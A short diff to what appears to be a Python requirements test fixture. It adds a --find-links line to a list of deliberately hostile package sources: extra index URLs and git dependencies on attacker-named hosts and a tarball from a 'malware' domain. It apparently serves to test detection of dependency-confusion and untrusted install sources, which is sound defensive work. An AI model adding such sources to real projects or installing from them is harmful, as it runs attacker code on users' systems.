@@ -2,6 +2,7 @@
 --extra-index-url https://pypi.attacker.test/simple/
 --extra-index-url=https://pypi-equals.attacker.test/simple/
 -e git+https://github.com/attacker/editable.git#egg=evil
+--find-links https://links.attacker.test/wheels/
 evil-helper @ git+https://github.com/attacker/evil-helper.git@main
 ssh-dep @ git+ssh://git@github.com/attacker/ssh-dep.git
 https://malware.example.com/payload-1.0.tar.gz
